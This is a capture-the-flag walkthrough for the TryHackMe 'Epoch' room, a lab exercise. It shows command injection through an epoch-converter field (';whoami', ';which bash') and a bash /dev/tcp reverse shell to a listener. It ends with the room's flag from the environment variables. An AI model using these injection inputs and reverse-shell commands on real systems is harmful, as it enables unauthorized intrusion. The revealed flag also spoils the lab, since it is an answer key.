# Epoch Walkthrough
### Link
- https://tryhackme.com/room/epoch
---

### Recon
- First, try to reach the machien http://[IP]. That is an EPOCH convert website.

From the disclaimer of this challenge, we have a reference to another room : command injection. So we can expect to use some injection pattern to find the flag.

- Second, try a basic conversion time
```
initial value : 123456789123
result : Sat Mar 11 00:32:03 UTC 5882
```

- Third, let's try to add a command like **whoami**
```
initial value : 123456789123;whoami
result : 
Sat Mar 11 00:32:03 UTC 5882
challenge
```

So we have the confirmation that we can inject command. From now, let's try to to a reverseshell to gain access to the targeted machine ^^

### Reverse Shell

- First, check the bash path
```
initial value : 123456789123;which bash
result :
Sat Mar 11 00:32:03 UTC 5882
/usr/bin/bash

```

Now we can try to find the appropriate command line to initiate the reverse shell. 

Visit the website [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and use the command under **Bash**
```
bash -i >& /dev/tcp/[IP]/[Port] 0>&1

```

- First, start the listener on your machine
```
nc -nlvp [Port]
```
- Second, use the command from [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
```
/usr/bin/bash -i >& /dev/tcp/[IP local machine]/[Port] 0>&1
```
Result
```
challenge@e7c1352e71ec:~$ whoami
whoami
challenge
challenge@e7c1352e71ec:~$
```
- Third, Find the flag. For that , check the information provided in the room through the **HINT**
```
The developer likes to store data in environment variables, can you find anything of interest there?
```
So we must check the environment variables
```
challenge@e7c1352e71ec:~$ env
env
HOSTNAME=e7c1352e71ec
PWD=/home/challenge
HOME=/home/challenge
LS_COLORS=
GOLANG_VERSION=1.15.7
FLAG=flag{7da6c7debd40bd611560c13d8149b647}
SHLVL=2
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
```

**Question**
#### Find the flag in this vulnerable web application!
**Answer** 
#### flag{7da6c7debd40bd611560c13d8149b647}
